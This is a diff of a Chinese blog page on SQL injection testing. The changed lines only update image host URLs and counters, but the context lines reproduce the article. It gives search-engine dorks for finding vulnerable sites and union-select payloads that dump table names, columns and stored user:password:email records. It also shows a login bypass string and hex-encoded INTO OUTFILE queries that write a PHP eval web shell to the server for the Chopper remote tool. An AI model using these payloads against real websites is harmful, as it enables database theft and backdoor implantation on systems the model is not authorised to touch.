@@ -60,20 +60,20 @@ inurl:gallery.php?id=
 inurl:article.php?id=
 inurl:pageid=
 site: http:// www.xxx.com  inurl:php?id= //针对某个">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/inject-1.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/inject-2.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/inject-3.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/inject-4.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/inject-5.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/inject-6.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/inject-7.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/inject-8.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/inject-9.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/inject-10.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/inject-13.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/inject-11.png">
-<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/inject-12.png">
-<meta property="og:updated_time" content="2015-12-31T11:53:10.000Z">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/inject-1.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/inject-2.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/inject-3.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/inject-4.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/inject-5.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/inject-6.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/inject-7.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/inject-8.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/inject-9.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/inject-10.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/inject-13.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/inject-11.png">
+<meta property="og:image" content="http://o9xrwsn0z.bkt.clouddn.com/inject-12.png">
+<meta property="og:updated_time" content="2016-07-07T14:23:11.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入测试思路">
 <meta name="twitter:description" content="SQL注入测试思路整理
@@ -441,20 +441,20 @@ inurl:pageid=
 </code></pre><h2 id="二-检测一下目标是否有明显漏洞">二.检测一下目标是否有明显漏洞</h2><p>搜索结果会出来一大堆，一个简单的测试方式是在Url末尾的数字后面加单引号或者加上 and 1=1 或者 1=2<br>看看界面是否有明显变化或者直接就给出SQL的报错语句了。</p>
 <pre><code><span class="keyword">http</span>://localhost/test/<span class="built_in">get</span>.php?id=<span class="number">1</span> <span class="operator">and</span> <span class="number">1</span>=<span class="number">1</span>
 <span class="keyword">http</span>://localhost/test/<span class="built_in">get</span>.php?id=<span class="number">1</span> <span class="operator">and</span> <span class="number">1</span>=<span class="number">2</span>
-</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-1.png" alt=""><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-2.png" alt=""></p>
+</code></pre><p><img src="http://o9xrwsn0z.bkt.clouddn.com/inject-1.png" alt=""><br><img src="http://o9xrwsn0z.bkt.clouddn.com/inject-2.png" alt=""></p>
 <h2 id="三-看看该表有多少个字段">三.看看该表有多少个字段</h2><p>测试语句： order by number<br>一般从小往大的尝试，比如1,2,3,4,5都能看见网页界面，然后6就报错了，那么很明显这个网页对应的表只有5个字段</p>
 <h2 id="四-找到有漏洞的字段">四.找到有漏洞的字段</h2><p>将存在注入点的字段值改为负，目的是不显示数据<br>然后注入语句为 union select 1,2,3,4,5 (数字为字段个数)<br>找到漏洞的字段，即能被显示出来的字段，用于显示获取的注入信息</p>
-<h2 id="五-找到对应的版本号，数据库和用户">五.找到对应的版本号，数据库和用户</h2><p>将第四部显示的字段值分别替换version(), user(), database()获取数据库信息<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-3.png" alt=""></p>
+<h2 id="五-找到对应的版本号，数据库和用户">五.找到对应的版本号，数据库和用户</h2><p>将第四部显示的字段值分别替换version(), user(), database()获取数据库信息<br><img src="http://o9xrwsn0z.bkt.clouddn.com/inject-3.png" alt=""></p>
 <h2 id="六-爆库">六.爆库</h2><h3 id="MySql-version()_&gt;_5">MySql.version() &gt; 5</h3><p>如果获取的版本为Mysql 5以上，则有内置库information_schema，存储着mysql的所有数据库和表结构信息</p>
 <h4 id="1-获取该库下其他表">1.获取该库下其他表</h4><p>将漏洞字段替换为group_concat(table_name) 然后语句后边添加 from information_schema.tables where table_schema=database()</p>
 <pre><code>http://localhost/test/get.php?id=-1 union <span class="operator"><span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span>
-</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-4.png" alt=""></p>
+</code></pre><p><img src="http://o9xrwsn0z.bkt.clouddn.com/inject-4.png" alt=""></p>
 <h4 id="2-获取表中字段名">2.获取表中字段名</h4><p>把”group_concat(table_name)”替换成”group_concat(column_name)”<br>把”from information_schema.tables where table_schema=database()–” 替换成”FROM information_schema.columns WHERE table_name=表名—<br>其中表明需要编码</p>
 <pre><code>http://localhost/test/get.php?id=-1 union <span class="operator"><span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_name=<span class="built_in">CHAR</span>(<span class="number">115</span>, <span class="number">113</span>, <span class="number">108</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>) //table_name = sqlinject</span>
-</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-5.png" alt=""></p>
+</code></pre><p><img src="http://o9xrwsn0z.bkt.clouddn.com/inject-5.png" alt=""></p>
 <h4 id="3-查询表获得账户等信息">3.查询表获得账户等信息</h4><p>例如获取user,password,email 字段内容<br>用group_concat(user,0x3a, password,0x3a, email)替换之前内容，数据库选择sqlinject，其中0x3a为分隔符</p>
 <pre><code>http://localhost/test/get.php?id=-1 union <span class="operator"><span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">user</span>,<span class="number">0x3a</span>, <span class="keyword">password</span>,<span class="number">0x3a</span>, email),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> sqlinject</span>
-</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-6.png" alt=""></p>
+</code></pre><p><img src="http://o9xrwsn0z.bkt.clouddn.com/inject-6.png" alt=""></p>
 <h3 id="MySql-version()_&lt;_5">MySql.version() &lt; 5</h3><p>如果获取的版本为Mysql 5以下，就需要暴力猜解表名</p>
 <h4 id="1-猜解表名">1.猜解表名</h4><p>一般的表的名称无非是admin adminuser user pass password 等</p>
 <pre><code><span class="keyword">and</span> <span class="number">0</span>&lt;&gt;(<span class="keyword">select</span> count<span class="comment">(*) from *)</span>
@@ -489,7 +489,7 @@ group by users.id, users.username, users.password, users.privs having 1=1
 <span class="keyword">UNION</span> <span class="keyword">Select</span> TOP <span class="number">1</span> login_blank&gt;_name <span class="keyword">FROM</span> logintable
 <span class="keyword">UNION</span> <span class="keyword">Select</span> TOP <span class="number">1</span> <span class="keyword">password</span> <span class="keyword">FROM</span> logintable <span class="keyword">where</span> login_blank&gt;_name=Rahul</span>
 </code></pre><h2 id="七-挂马">七.挂马</h2><h3 id="1-判断数据库权限">1.判断数据库权限</h3><pre><code>and <span class="function"><span class="title">ord</span><span class="params">(mid(user()</span></span>,<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span> <span class="comment">/* 返回正常说明为root</span>
-</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-7.png" alt=""><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-8.png" alt=""></p>
+</code></pre><p><img src="http://o9xrwsn0z.bkt.clouddn.com/inject-7.png" alt=""><br><img src="http://o9xrwsn0z.bkt.clouddn.com/inject-8.png" alt=""></p>
 <h3 id="2-直接写马">2.直接写马</h3><ul>
 <li>1.知道站点物理路径</li>
 <li>2.有足够大的权限(如root)（可以用select …. from mysql.user测试）</li>
@@ -497,8 +497,8 @@ group by users.id, users.username, users.password, users.privs having 1=1
 </ul>
 <p>select 一句话 into outfile “物理路径”<br>&lt;?php @eval($_POST[‘igigt’]);?&gt; 转为16进制形式  0x3C3F70687020406576616C28245F504F53545B276967696774275D293B3F3E</p>
 <pre><code>http://localhost/test/get_root.php?id=1 union select <span class="number">0x3C3F70</span><span class="number">68702040657</span><span class="number">6616C28245</span>F<span class="number">504F53545</span>B<span class="number">27696769677</span><span class="number">4275D293</span>B3F3E,2,3,4 from mysql.user into outfile "d:\igigt.php"
-</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-9.png" alt=""></p>
-<p>在D盘目录下即可找到一句话，然后菜刀连<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-10.png" alt=""></p>
+</code></pre><p><img src="http://o9xrwsn0z.bkt.clouddn.com/inject-9.png" alt=""></p>
+<p>在D盘目录下即可找到一句话，然后菜刀连<br><img src="http://o9xrwsn0z.bkt.clouddn.com/inject-10.png" alt=""></p>
 <h3 id="3-通过建临时表写马">3.通过建临时表写马</h3><pre><code>CREATE TABLE <span class="function"><span class="title">igigt</span><span class="params">(cmd text)</span></span>
 INSERT INTO <span class="function"><span class="title">igigt</span><span class="params">(cmd)</span></span> <span class="function"><span class="title">VALUES</span><span class="params">(<span class="string">"&lt;?php @eval($_POST['igigt']);?&gt;"</span>)</span></span> <span class="comment">// 或(推荐0x方式)</span>
 INSERT INTO <span class="function"><span class="title">igigt</span><span class="params">(cmd)</span></span> <span class="function"><span class="title">VALUES</span><span class="params">(<span class="number">0</span>x3C3F70687020406576616C28245F504F53545B276967696774275D293B3F3E)</span></span>
@@ -506,18 +506,18 @@ SELECT cmd FROM igigt into OUTFILE <span class="string">"d:\\test.php"</span>
 DROP TABLE igigt
 </code></pre><h3 id="4-LOAD_FILE">4.LOAD_FILE</h3><p>LOAD_FILE可以加载文件，对获取网站信息以及物理路径有很大帮助，不过同outfile一样也需要root权限</p>
 <pre><code><span class="rule"><span class="attribute">http</span>:<span class="value">//localhost/test/get_root.php?id=<span class="number">1</span> union select <span class="function">LOAD_FILE</span>(<span class="string">"d:\\igigt.php"</span>)</span></span>
-</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-13.png" alt=""></p>
+</code></pre><p><img src="http://o9xrwsn0z.bkt.clouddn.com/inject-13.png" alt=""></p>
 <h3 id="5-权限不够">5.权限不够</h3><p>提权或者扫后台，解密用户名密码(一般为MD5加密)登录之后挂马</p>
 <h2 id="八-其他">八.其他</h2><h3 id="1-登录弱密码">1.登录弱密码</h3><p>user:admin’ or ‘1’=’1<br>pwd:admin’ or ‘1’=’1</p>
 <h3 id="2-确认数据库类型">2.确认数据库类型</h3><p>只有MYSQL解析</p>
 <pre><code><span class="keyword">and</span> <span class="keyword">ord</span>(mid(version(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">51</span>/* 确认数据库版本 <span class="number">51</span>是ASCII码<span class="number">3</span> 正确则&gt;<span class="number">4.0</span> 错误则&lt;<span class="number">4.0</span>
 http://localhost/test/get.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ord</span>(mid(version(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">51</span>
-</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-11.png" alt=""></p>
+</code></pre><p><img src="http://o9xrwsn0z.bkt.clouddn.com/inject-11.png" alt=""></p>
 <p>两错为access 一错二对为mssql(SQLServer)</p>
 <pre><code><span class="keyword">and</span> (<span class="keyword">select</span> count<span class="comment">(*) from sysobjects)&gt;0 //msysobjects为access特有 但默认无权限读取
 and (select count(*)</span> <span class="keyword">from</span> msysobjects)&gt;<span class="number">0</span> <span class="comment">//sysobjects为mssql特有</span>
 </code></pre><h3 id="3-操作系统信息">3.操作系统信息</h3><pre><code>and <span class="number">1</span>=<span class="number">2</span> <span class="class"><span class="keyword">union</span> <span class="title">all</span> <span class="title">select</span> @@<span class="title">global</span>.<span class="title">version_compile_os</span> <span class="title">from</span> <span class="title">mysql</span>.<span class="title">user</span></span>
-</code></pre><p>访问mysql.user需要root权限<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/inject-12.png" alt=""></p>
+</code></pre><p>访问mysql.user需要root权限<br><img src="http://o9xrwsn0z.bkt.clouddn.com/inject-12.png" alt=""></p>
 <h3 id="4-利用内置变量">4.利用内置变量</h3><pre><code><span class="rule"><span class="attribute">http</span>:<span class="value">//www.mytest.com/showdetail.asp?id=<span class="number">49</span> </span></span>;<span class="tag">and</span> <span class="tag">user</span>&gt;0
 </code></pre><p>user是SQLServer的一个内置变量，它的值是当前连接的用户名，类型为 nvarchar。<br>拿一个 nvarchar 的值跟 int 的数 0 比较，系统会先试图将 nvarchar 的值转成 int 型，<br>当然，转的过程中肯定会出错，SQLServer 的出错提示是：将 nvarchar 值 ”abc” 转换数据类型为 int 的列时发生语法错误，<br>abc 正是变量 user 的值，这样，不废吹灰之力就拿到了数据库的用户名。</p>
 <p>类似的例子and user&gt;0，作用是获取连接用户名，db_name()是另一个系统变量，返回的是连接的数据库名。</p>
@@ -756,7 +756,7 @@ and (select count(*)</span> <span class="keyword">from</span> msysobjects)&gt;<s
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">56</span>
+              <span class="site-state-item-count">58</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -770,7 +770,7 @@ and (select count(*)</span> <span class="keyword">from</span> msysobjects)&gt;<s
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">30</span>
+              <span class="site-state-item-count">31</span>
               <span class="site-state-item-name">标签</span>
               </a>
           </div>
